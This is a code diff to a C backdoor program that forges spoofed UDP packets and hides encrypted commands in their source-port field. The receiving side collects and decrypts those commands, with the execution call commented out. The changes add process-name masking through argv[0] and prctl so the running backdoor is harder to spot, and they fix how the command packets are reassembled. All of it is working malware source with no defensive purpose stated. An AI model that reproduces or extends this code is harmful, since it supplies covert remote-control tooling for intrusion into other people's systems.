@@ -10,8 +10,12 @@ int main(int argc, char **argv)
     int count;
     char desthost[80], srchost[80];
 
+    memset(argv[0], 0, strlen(argv[0]));
+    strcpy(argv[0], MASK);
+    prctl(PR_SET_NAME, MASK, 0, 0);
+
     /* Title */
-    printf("\nNot Starting the Backdoor\n\n");
+    printf("\nNot Starting the Backdoor ;)\n\n");
 
     /* Can they run this? */
     if (geteuid() != 0)
@@ -83,11 +87,12 @@ int main(int argc, char **argv)
     }
 
     /* Do the dirty work */
-    int cypher_len = 0;
-    unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
 
     if (backdoor == 0)
     {
+        int cypher_len = 0;
+        unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
+
         fprintf(stdout, "Client..\n");
         cypher_len = forgepacket(ciphertext);
         client(source_host, dest_host, dest_port, ciphertext, cypher_len);
@@ -125,7 +130,7 @@ int forgepacket(unsigned char *ciphertext)
     char commandBuffer[BUFF_SIZE];
     memset(&commandBuffer, 0, BUFF_SIZE);
 
-    fprintf(stdout, "\nEnter Command:");
+    fprintf(stdout, "\nEnter Command: ");
     fgets(commandBuffer, BUFF_SIZE, stdin);
 
     // ENCRYPT DATA
@@ -160,16 +165,15 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
     int send_socket;
     struct sockaddr_in sin;
     struct send_udp send_udp;
+    // fprintf(stdout, "Data: %x \n", data);
 
-    for (int i = 0; i < (data_len + 1); i++)
+    for (int i = 0; i <= data_len; i++)
     {
         /* Delay loop. This really slows things down, but is necessary to ensure */
         /* semi-reliable transport of messages over the Internet and will not flood */
         /* slow network connections */
         /* A better should probably be developed */
-        sleep(1);
-        fprintf(stdout, "Sending: ");
-        fprintf(stdout, "%d\n", data[i]);
+        sleep(2);
 
         /* Make the IP header with our forged information */
         send_udp.ip.ihl = 5;
@@ -197,7 +201,9 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         if (i == 0)
             send_udp.udp.source = (htons(data_len));
         else
-            send_udp.udp.source = (htons(data[i]));
+            send_udp.udp.source = (htons(data[i - 1]));
+
+        fprintf(stdout, "Sending: %d | %d | %d\n", i, data_len, htons(send_udp.udp.source));
 
         /* Drop our forged data into the socket struct */
         sin.sin_family = AF_INET;
@@ -262,9 +268,10 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
     char *commandBuffer;
     int temp = 0;
     int size = 0;
-    int packet_counter = 0;
+    bool open = true;
+    int pc = 0;
 
-    while (1) /* read packet loop */
+    while (open) /* read packet loop */
     {
         /* Open socket for reading */
         recv_socket = socket(AF_INET, SOCK_RAW, 17);
@@ -280,41 +287,48 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         // corect dp and correct flag
         if (ntohs(recv_packet.udp.dest) == dest_port)
         {
-            if (packet_counter == 0)
+            temp = ntohs(recv_packet.udp.source);
+            fprintf(stdout, "Received: %d of %d : %d", pc, size, temp);
+
+            if (pc == 0)
             {
-                size = ntohs(recv_packet.udp.source);
+                size = temp;
                 commandBuffer = (char *)malloc(size);
-                packet_counter++;
+                pc++;
             }
             else
             {
-                if (packet_counter < size)
+                if (pc <= size)
                 {
-                    temp = ntohs(recv_packet.udp.source);
-                    sprintf((commandBuffer + packet_counter), "%d", temp);
-
-                    fprintf(stdout, "%d", temp);
-                    packet_counter++;
+                    sprintf((commandBuffer + (pc - 1)), "%c", temp);
+                    pc++;
                 }
-                else
+
+                // Received everything
+                if (pc == size)
                 {
+                    fprintf(stdout, "Original: %s\n", commandBuffer);
+
                     // DECRYPT AND EXECUTE
                     char *decryptedtext = (char *)malloc(size);
                     int decryptedtext_len = decrypt((unsigned char *)commandBuffer, size, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)decryptedtext);
 
-                    fprintf(stdout, "%d \n%s\n", decryptedtext_len, decryptedtext);
+                    fprintf(stdout, "Decypher: %d | %s\n", decryptedtext_len, decryptedtext);
 
                     // Read
                     // fp = popen(decryptedtext, "r");
 
-                    // Send
+                    // IF Exit command;
+                    open = false;
+
+                    // Else Send
                     int cypher_len = 0;
                     unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
                     cypher_len = forgepacket(ciphertext);
                     client(source_addr, dest_addr, dest_port, ciphertext, cypher_len);
 
                     // Reset Counters
-                    packet_counter = 0;
+                    pc = 0;
                     size = 0;
                 }
             }
